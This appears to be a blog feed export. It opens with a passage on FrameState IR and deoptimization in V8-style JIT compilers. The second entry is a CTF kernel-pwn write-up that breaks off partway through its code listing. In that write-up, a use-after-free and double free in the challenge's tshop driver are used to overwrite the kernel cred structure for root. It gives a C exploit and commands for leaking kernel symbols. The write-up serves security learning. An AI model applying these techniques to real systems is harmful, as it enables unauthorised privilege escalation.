    <content type="html"><![CDATA[<h2><span id="intro-analsis-of-framestates-ir">Intro: Analsis of Framestates IR</span></h2> <a id="more"></a><h2><span id="basic-framestates">Basic Framestates</span></h2><p>我们通过使用deoptimization来实现推测性优化，deoptimization将执行主体从优化代码转移到解释器。要做到这一点，需要知道：</p><ul><li>想继续解释代码的地方</li><li>如何从优化代码的物理机器状态在延续点重构VM状态。</li></ul><p>为了知道我们想要在哪里继续执行，我们保存了对方法的引用和一个字节码索引(bci)(bytecode index,为了让 Ignition 找到准确解释执行点)。对于VM状态，我们将本地变量和操作数堆栈槽映射到它们在IR中的值，当deopt时可以将它们映射到它们的物理位置。</p><p>在IR中，我们跟踪可能对虚拟机的全局状态产生副作用的节点的数据，比如内存写入、方法调用和monitor获取或释放。这些会产生新的VM状态的节点我们称为状态剥离节点。对于这些节点，我们需要保存虚拟机在执行这些node之后的状态信息。</p><p>状态剥离节点本身不能完成从VM状态到IR节点的映射，对于此我们单独表示为 Framestates。这些新节点包含延续点的 methods 和 bci，它们有本地变量和操作数堆栈槽的输入。State 剥离节点(比如 StoreProperty ) 有一个描述 VM 状态的 FrameState 作为输入，然后将执行后的VM状态写入FrameState。这方面的一个例子如下所示：<img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190702162817.png" alt>在这个例子中，两个Store节点均存在副作用，因此存在 State 剥离，需要有对 FrameState 节点的引用。这些 FrameState 节点描述了剥离节点执行完虚拟机的状态。</p><p>在正式emit代码之前，我们需要将deopt信息与能够触发deopt的节点关联起来。为此，我们使用了在触发deopt的节之前最后一个主状态剥离节点的deopt信息。这意味着两个状态剥离节点之间的所有指令deopt到同个Bytecode，共享同一组栈变量。因此，JIT已经执行的一些指令可能在deopt之后由解释器重新执行。这种重新执行是合理的，因为任何重新执行的指令都不会修改全局State，或者说均不是状态剥离节点。</p><p>举个例子，如图5：<img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190702171322.png" alt>图中的Guard节点作为一个边界检查，如果检查fail将会返回deopt。在这个例子中，如果要实现deopt，那我们将会使用 FrameState bci=18 节点里的 deopt 信息，对应的状态剥离节点为 StoreField b。</p><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190702174517.png" alt><br>如果遇到了分支合并，则需要在Merge节点上保留 FrameState 信息，如图6。如此一来，任何在merge后面的deopt节点均可以回溯到merge。否则的话，由于 merge 会产生状态选择，IR 将无法描述 merge之后的 VM 状态，Ignition可能会执行产生错误的 side effect 的操作。</p><p>这个设计模型意味着任何可能导致 deopt 的节点都要与 deopt 信息相关联。</p><h2><span id="嵌套-framestates">嵌套 Framestates</span></h2><p>一个 FrameState 节点可以精确地表示一个 method 活跃区的 VM 状态，但是，method Inline 将会将多个嵌套的活跃区引入到一个 IR 实例中，所以 deopt 信息将由多重嵌套的 VM 状态组成。如何实现呢？方法是在IR中通过让一个 FrameState 节点引用另一个 FrameState 节点，后者被称为 outer FrameState。图7展示了一个例子：<img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190702215251.png" alt><br>需要注意的是，多个 inner FrameState可以引用相同的 outer FrameState ，这使得 FrameState 在 IR 中是树状表示的。</p><h2><span id="virtual-object">Virtual Object</span></h2><p>一些更高级优化甚至需要更多的信息来反应 VM 状态，比如 escape-analysis ，将会导致源文件中的某数据结构直接被优化掉，不能被实际分配。在这种情况下，如果进行deopt，则需要知道JIT优化掉了什么对象以及这些对象是什么值。如果有了这些信息，那么在 deopt 的时候就可以重新对消失的对象进行分配以及赋值了。<br><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190703032631.png" alt><br>图8展示了IR中如何表示虚拟的对象(将要被JIT优化掉)。每一个虚拟对象都会被表示为VirtualObject节点，而且每一个引用这些虚拟对象的栈槽或者本地变量都会指向该节点。VirtualObject节点真实的内容保存在VirtualObjectState节点，作为 FrameState 的叶节点。</p><p>ps: 其实我不是很能理解为什么 FrameState 需要保留对 VirtualObjectState的引用，而且obj.v节点可以产生新的 FrameState，图中并未体现出来。另外，根绝这个设计思想，可以推断 escape-analysis 在具体实现当中可能会把 HeapAlloc 节点转化为 VirtualObject，并且可能是通过 inner FrameState 是否存在对 outer FrameState 的某些栈插槽的更改来判断变量是否逃逸，后续的博客会整理出 V8 escape-analysis 的具体细节。</p><h2><span id="reference">Reference</span></h2><p><a href="http://lafo.ssw.uni-linz.ac.at/papers/2013_VMIL_GraalIR.pdf" target="_blank" rel="noopener">An Intermediate Representation for Speculative Optimizations in a Dynamic Compiler</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Intro-Analsis-of-Framestates-IR&quot;&gt;&lt;a href=&quot;#Intro-Analsis-of-Framestates-IR&quot; class=&quot;headerlink&quot; title=&quot;Intro: Analsis of Framestates IR&quot;&gt;&lt;/a&gt;Intro: Analsis of Framestates IR&lt;/h2&gt;
    
    </summary>
    
      <category term="Browser Explore" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/"/>
    
      <category term="V8" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/V8/"/>
    
      <category term="optimize" scheme="http://p1umer.gituhb.io/categories/Browser-Explore/V8/optimize/"/>
    
    
      <category term="Browser Explore" scheme="http://p1umer.gituhb.io/tags/Browser-Explore/"/>
    
      <category term="optimize" scheme="http://p1umer.gituhb.io/tags/optimize/"/>
    
  </entry>
  
  <entry>
    <title>Linux Kernel 初探（一）BabyKernel</title>
    <link href="http://p1umer.gituhb.io/2019/05/30/Linux%20Kernel%20%E5%88%9D%E6%8E%A2/"/>
    <id>http://p1umer.gituhb.io/2019/05/30/Linux Kernel 初探/</id>
    <published>2019-05-30T14:04:29.000Z</published>
    <updated>2019-07-04T15:38:46.747Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="intro-linux-kernel-的第一次探索">Intro: Linux Kernel 的第一次探索</span></h2> <a id="more"></a><h2><span id="写在前面">写在前面</span></h2><p>【+】本文首发于安全客 <a href="https://www.anquanke.com/post/id/179161" target="_blank" rel="noopener">https://www.anquanke.com/post/id/179161</a> </p><h2><span id="相关链接">相关链接</span></h2><p>【+】题目：<a href="https://drive.google.com/open?id=1B5EKTB3c2sYHg26f_tvxejrP0HFzj1Qi" target="_blank" rel="noopener">https://drive.google.com/open?id=1B5EKTB3c2sYHg26f_tvxejrP0HFzj1Qi</a><br>【+】 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge/</a><br>【+】 <a href="http://p4nda.top" target="_blank" rel="noopener">http://p4nda.top</a><br>【+】 <a href="https://sunichi.github.io" target="_blank" rel="noopener">https://sunichi.github.io</a></p><h2><span id="题目描述">题目描述</span></h2><p>解压<a href="https://drive.google.com/open?id=1B5EKTB3c2sYHg26f_tvxejrP0HFzj1Qi" target="_blank" rel="noopener">题目</a>我们可以拿到以下文件:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p1umer@ubuntu:~/kernel/give_to_player$ ls -l</span><br><span class="line">total 5516</span><br><span class="line">-rwxr-xr-x 1 p1umer p1umer     202 May  9 00:09 boot.sh</span><br><span class="line">-rw-r--r-- 1 p1umer p1umer 4127776 May  9 00:09 bzImage</span><br><span class="line">-rw-r--r-- 1 p1umer p1umer 1514482 May  9 04:35 initramfs.img</span><br></pre></td></tr></table></figure></p><p>将initramfs.img后缀改为.cpio后用ubuntu再次解压可以得到如下文件：<br><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515013157.png" alt></p><p>在poc文件夹内找到tshop.ko文件，使用IDA分析：<br><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515013311.png" alt></p><p>其中可以观察到，主要函数有三个：</p><ul><li>tshop-ioctl</li><li>tshop-init</li><li>tshop-exit</li></ul><p>其中核心函数是 tshop-ioctl 需要重点分析，我们后面会具体分析这个函数</p><h2><span id="调试以及数据交互">调试以及数据交互</span></h2><h3><span id="程序启动以及调试">程序启动以及调试</span></h3><p>题目包含了一个 qemu 的启动脚本如下：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -nographic \</span><br><span class="line">    -append &quot;rdinit=/linuxrc console=ttyS0 oops=panic panic=1&quot; \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -cpu qemu64,smap,smep -initrd initramfs.img \</span><br><span class="line">    -smp cores=1,threads=1 2&gt;/dev/null \</span><br></pre></td></tr></table></figure></p><p>可以看到其中如果选择开启kaslr则需要在 -append 选项后面加上kaslr即可<br>如果选择gdb调试，则需要加上：<code>-gdb tcp::4869 -S</code> （其中-S为挂起等待），对应的gdb脚本：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb \</span><br><span class="line">    -ex &quot;add-auto-load-safe-path $(pwd)&quot; \</span><br><span class="line">    -ex &quot;file vmlinux&quot; \</span><br><span class="line">    -ex &apos;set arch i386:x86-64:intel&apos; \</span><br><span class="line">    -ex &apos;target remote localhost:4869&apos; \</span><br><span class="line">    -ex &apos;continue&apos; \</span><br><span class="line">    -ex &apos;disconnect&apos; \</span><br><span class="line">    -ex &apos;set arch i386:x86-64&apos; \</span><br><span class="line">    -ex &apos;target remote localhost:4869&apos;</span><br></pre></td></tr></table></figure></p><h3><span id="exp编写以及数据交互">EXP编写以及数据交互</span></h3><p>Kernel Pwn 如何和驱动模块进行交互呢？</p><p>驱动处理预期流程是：</p><ul><li>用户态调用驱动触发状态切换</li><li>进入内核态内核态响应用户请求</li><li>处理数据返回结果</li><li>切换回用户态</li></ul><p>那么如何在用户态调用驱动呢？</p><p>首先，对一个字符设备而言有如下结构体：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct file_operations d_fops = &#123;</span><br><span class="line">.owner = THIS_MODULE,</span><br><span class="line">.open = d_open,</span><br><span class="line">.read = d_read,</span><br><span class="line">.write = d_write,</span><br><span class="line">.ioctl = d_ioctl,</span><br><span class="line">.release = d_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>该结构体展示了部分文件操作对应的函数指针。如读该设备时会调用d_open函数。从该结构体我们可以看出其实现了用户与内核驱动交互的接口，同时也就自然成为了内核攻击面之一。具体的调用方法为：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char *argv[])&#123;</span><br><span class="line">    int fd = open(&quot;/dev/tshop&quot;,0);</span><br><span class="line">    //debug();</span><br><span class="line">    ioctl(fd,MALLOC,0);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><ul><li>fd打开设备</li><li>通过ioctl进行具体的交互（或者该驱动注册的其他处理函数）</li></ul><p>好了，可以实现和驱动模块的交互后，我们就可以用c语言来编写相应的exploit了。但是在这之前，我们先了解一下内核的一些保护模式</p><h2><span id="缓释机制">缓释机制</span></h2><h3><span id="mmap_min_addr">mmap_min_addr</span></h3><p>指定用户进程通过mmap可使用的最小虚拟内存地址，以避免其在低地址空间产生映射导致安全问题。</p><h3><span id="kptr_restrict-dmesg_restrict">kptr_restrict / dmesg_restrict</span></h3><p>在linux内核漏洞利用中常常使用commit_creds和prepare_kernel_cred来完成提权，它们的地址可以从/proc/kallsyms中读取。/proc/sys/kernel/kptr_restrict被默认设置为1以阻止通过这种方式泄露内核地址。dmesg_restrict限制非特权读dmesg（Restrict unprivileged access to kernel syslog）</p><h3><span id="smepsmap">SMEP/SMAP</span></h3><p>SMEP(Supervisor Mode Execution Prevention，管理模式执行保护)和SMAP(Supervisor Mode Access Prevention，管理模式访问保护)，其作用分别是禁止内核执行用户空间的代码和禁止内核访问用户空间的数据。</p><h2><span id="程序分析">程序分析</span></h2><p>前面提到，ida打开.ko文件得到如下内容：<br><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515013340.png" alt><br>可以得到如下信息：</p><ul><li>程序实现了kmalloc；kfree；edit1；edit2</li><li>程序维护了一个BUY_LIST用来存放kmen_cache_alloc分配的堆块</li><li>malloc的时候会把堆块写成特定值</li><li>两个edit函数改指针为固定值</li><li>有一个看起来没有参数的 kfree</li></ul><p>等等，kfree没有参数？让我们仔细分析它：<br><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515013412.png" alt><br>嗯，参数还是有的。但是这里面在释放完毕BUY_LIST里的堆块之后并没有清空，也就是说我们得到了一个UAF!</p><h2><span id="调试判断-cred-结构体大小">调试判断 Cred 结构体大小</span></h2><p>若要达到提权权限，则需要修改权限信息。kernel记录了线程的权限，更具体的，是用 cred 结构体记录的，每个线程中都有一个cred结构，这个结构保存了该进程的权限等信息（uid，gid等），如果能修改某个进程的cred，那么也就修改了这个进程的权限。所以我们需要得到Cred结构体大小，以便为后面的 exploit 拓展思路。</p><p>首先打开源码查看cred结构体定义<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">struct cred &#123;</span><br><span class="line">    atomic_t    usage;</span><br><span class="line">#ifdef CONFIG_DEBUG_CREDENTIALS</span><br><span class="line">    atomic_t    subscribers;    /* number of processes subscribed */</span><br><span class="line">    void        *put_addr;</span><br><span class="line">    unsigned    magic;</span><br><span class="line">#define CRED_MAGIC    0x43736564</span><br><span class="line">#define CRED_MAGIC_DEAD    0x44656144</span><br><span class="line">#endif</span><br><span class="line">    uid_t        uid;        /* real UID of the task */</span><br><span class="line">    gid_t        gid;        /* real GID of the task */</span><br><span class="line">    uid_t        suid;        /* saved UID of the task */</span><br><span class="line">    gid_t        sgid;        /* saved GID of the task */</span><br><span class="line">    uid_t        euid;        /* effective UID of the task */</span><br><span class="line">    gid_t        egid;        /* effective GID of the task */</span><br><span class="line">    uid_t        fsuid;        /* UID for VFS ops */</span><br><span class="line">    gid_t        fsgid;        /* GID for VFS ops */</span><br><span class="line">    unsigned    securebits;    /* SUID-less security management */</span><br><span class="line">    kernel_cap_t    cap_inheritable; /* caps our children can inherit */</span><br><span class="line">    kernel_cap_t    cap_permitted;    /* caps we&apos;re permitted */</span><br><span class="line">    kernel_cap_t    cap_effective;    /* caps we can actually use */</span><br><span class="line">    kernel_cap_t    cap_bset;    /* capability bounding set */</span><br><span class="line">#ifdef CONFIG_KEYS</span><br><span class="line">    unsigned char    jit_keyring;    /* default keyring to attach requested</span><br><span class="line">                     * keys to */</span><br><span class="line">    struct key    *thread_keyring; /* keyring private to this thread */</span><br><span class="line">    struct key    *request_key_auth; /* assumed request_key authority */</span><br><span class="line">    struct thread_group_cred *tgcred; /* thread-group shared credentials */</span><br><span class="line">#endif</span><br><span class="line">#ifdef CONFIG_SECURITY</span><br><span class="line">    void        *security;    /* subjective LSM security */</span><br><span class="line">#endif</span><br><span class="line">    struct user_struct *user;    /* real user ID subscription */</span><br><span class="line">    struct user_namespace *user_ns; /* cached user-&gt;user_ns */</span><br><span class="line">    struct group_info *group_info;    /* supplementary groups for euid/fsgid */</span><br><span class="line">    struct rcu_head    rcu;        /* RCU deletion hook */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>emmm，直接判断大小貌似有点困难，调试一下好了。<br>注意,由于系统开启了kptr_restrict，我们无法看到一些地址信息，所以我们需要关闭。<br>【关闭 kptr_restrict】：修改解压后的 /etc/.init/rcS 文件中的<br><code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code> 为 <code>echo 0 &gt; /proc/sys/kernel/kptr_restrict</code> </p><p>这时候就可以得到一些我们感兴趣的地址：<br>【kmem_cache_alloc】：<code>cat /proc/kallsyms |grep kmem_cache_alloc</code><br>【kfree】：<code>cat /proc/kallsyms |grep kfree</code><br>【prepare_cred】：<code>cat /proc/kallsyms | grep prepare_cred</code><br>【tshop的bss地址】：<code>cat /sys/module/tshop/sections/.bss</code></p><p>另外，我们在用户态执行fork函数的时候，可以调用内核prepare_cred来创建cred结构体提供给新进程的新线程。</p><p>所以我们编写一个简单的demo.c:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * main.c</span><br><span class="line"> * Copyright (C) 2019 P1umer &lt;cz18811105578@gmail.com&gt;</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">// gcc exp.c -o exp --static -lpthread</span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;poll.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;linux/userfaultfd.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;poll.h&gt;</span><br><span class="line">#include &lt;linux/prctl.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define MALLOC 0x271A</span><br><span class="line">#define FREE   0x2766</span><br><span class="line">#define EDIT1  0x1A0A</span><br><span class="line">#define EDIT2  0x22B8 </span><br><span class="line">pid_t pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void debug()&#123;</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])&#123;</span><br><span class="line">    int fd = open(&quot;/dev/tshop&quot;,0);</span><br><span class="line">    debug();</span><br><span class="line">    ioctl(fd,MALLOC,0);</span><br><span class="line">    fork()；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>【编译】：<code>gcc exp.c -o exp --static -lpthread</code><br>【打包】：打包命令为：<code>find . | cpio -o --format=newc &gt; ../initramfs.img</code></p><p>值得注意的是，我们因为调试的是内核，在内核中有很多的kmem_cache_alloc &amp;&amp; prepare_cred &amp;&amp; kfree 调用，因此我们只希望在 poc 调用内核这些函数的时候进行下断调试，因此getchar()是必要的。</p><p>启动 gdb+qemu 调试，断在 prepare_cred：<br><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515182753.png" alt><br>调用了<code>0xffffffff810d3251</code>，查看函数名：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/kallsyms | grep &quot;ffffffff810d3251&quot; </span><br><span class="line">ffffffff810d3251 T kmem_cache_alloc</span><br></pre></td></tr></table></figure></p><p>可以看到 prepare_cred 函数实际调用了 kmem_cache_alloc 来申请cred的空间，大小通过 $rsi 传参，为 0xd0。惊奇的发现，居然和我们ioctl操作中kmem_cache_alloc申请的大小一致 :)</p><h2><span id="exploit">Exploit</span></h2><p>上面提到有了一个UAF并且cred结构体大小和驱动malloc操作申请的堆块大小一致，那么接下来的事情就好办多了，在这之前先了解一下kernel里面的memory_management：</p><p>【+】<a href="http://www.wowotech.net/memory_management/247.html" target="_blank" rel="noopener">http://www.wowotech.net/memory_management/247.html</a></p><p>slab分配器的管理手段类似于 Glibc 中的 FastbinY。如果free链表内的chunk大小和该内核版本的 cred 结构体大小相同，那么会把free链表中的chunk解链返回给 cred。</p><p>于是我们就可以通过doublefree来进行提权：</p><ul><li>doublefree</li><li>得到cred结构体后通过两次malloc修改cred结构体中的值为特定的值（上面的ida分析有提到），恰好可以达到 root 要求</li></ul><p>这个地方遇到了一点困难：由于驱动的堆内存和内核的内存是共享的，在得到 cred 的同时会把cred的信息写入该内存，也就是说</p><ul><li>在我们准备doublefree之前：<br><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515013433.png" alt></li><li>把cred写入最末尾的chunk<br><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515013449.png" alt></li></ul><p>内核下一次申请的时候就会申请到非法地址，PANIC!<br>但是如果我们在系统申请非法地址之前讲free链表扩充到足够大是不是就可以缓解呢系统迟一点申请到非法地址呢? 我们来试一试：<br>编写exp.c(ugly code):<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * main.c</span><br><span class="line"> * Copyright (C) 2019 P1umer &lt;cz18811105578@gmail.com&gt;</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">// gcc exp.c -o exp --static -lpthread</span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;poll.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;linux/userfaultfd.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;poll.h&gt;</span><br><span class="line">#include &lt;linux/prctl.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define MALLOC 0x271A</span><br><span class="line">#define FREE   0x2766</span><br><span class="line">#define EDIT1  0x1A0A</span><br><span class="line">#define EDIT2  0x22B8 </span><br><span class="line">pid_t pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void debug()&#123;</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])&#123;</span><br><span class="line">    int fd = open(&quot;/dev/tshop&quot;,0);</span><br><span class="line">    debug();</span><br><span class="line"></span><br><span class="line">    ioctl(fd,MALLOC,0);</span><br><span class="line">    ioctl(fd,MALLOC,1);</span><br><span class="line">    ioctl(fd,MALLOC,2);</span><br><span class="line">    ioctl(fd,MALLOC,3);</span><br><span class="line">    ioctl(fd,MALLOC,4);</span><br><span class="line">    ioctl(fd,MALLOC,5);</span><br><span class="line">    ioctl(fd,MALLOC,6);</span><br><span class="line">    ioctl(fd,MALLOC,7);</span><br><span class="line">    ioctl(fd,MALLOC,8);</span><br><span class="line">    ioctl(fd,MALLOC,9);</span><br><span class="line">    ioctl(fd,MALLOC,10);</span><br><span class="line">    ioctl(fd,MALLOC,11);</span><br><span class="line">    ioctl(fd,MALLOC,12);</span><br><span class="line">    ioctl(fd,MALLOC,13);</span><br><span class="line">    ioctl(fd,MALLOC,14);</span><br><span class="line">    ioctl(fd,MALLOC,15);</span><br><span class="line">    ioctl(fd,MALLOC,16);</span><br><span class="line">    ioctl(fd,MALLOC,17);</span><br><span class="line">    </span><br><span class="line">    ioctl(fd,FREE,17);</span><br><span class="line">    ioctl(fd,FREE,16);</span><br><span class="line">    ioctl(fd,FREE,17);</span><br><span class="line"></span><br><span class="line">    pid=fork();</span><br><span class="line">    if(pid==0)&#123;</span><br><span class="line">        printf(&quot;[+] root?&quot;);</span><br><span class="line">        system(&quot;whoami&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">            ioctl(fd,MALLOC,16);</span><br><span class="line">            ioctl(fd,MALLOC,17);//cred==0 </span><br><span class="line"></span><br><span class="line">            ioctl(fd,FREE,0);</span><br><span class="line">            ioctl(fd,FREE,1);</span><br><span class="line">            ioctl(fd,FREE,2);</span><br><span class="line">            ioctl(fd,FREE,3);</span><br><span class="line">            ioctl(fd,FREE,4);</span><br><span class="line">            ioctl(fd,FREE,5);</span><br><span class="line">            ioctl(fd,FREE,6);</span><br><span class="line">            ioctl(fd,FREE,7);</span><br><span class="line">            ioctl(fd,FREE,8);</span><br><span class="line">            ioctl(fd,FREE,9);</span><br><span class="line">            ioctl(fd,FREE,10);</span><br><span class="line">            ioctl(fd,FREE,11);</span><br><span class="line">            ioctl(fd,FREE,12);</span><br><span class="line">            ioctl(fd,FREE,13);</span><br><span class="line">            